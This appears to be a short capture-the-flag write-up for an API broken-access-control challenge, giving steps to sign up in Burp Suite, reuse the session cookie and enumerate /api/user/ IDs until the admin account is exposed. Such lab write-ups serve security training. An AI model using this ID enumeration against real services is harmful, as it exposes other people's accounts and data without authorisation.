# Challenge07: API - Broken Access

## Solution

    1. Open Burp Suite and open target site.
    2. Sign up a new user:
    
```
{
    "username": "dnguyen",
    "password": "123"
}
```

    3. Use these infomation above to login and get cookie
    4. Make a get user request, with addition header:

```
Cookie: ... # get from step 3
```
    
    5. Try to get each user\_id:

```
/api/user/1
/api/user/2
...
```

    6. You will get the admin account :)
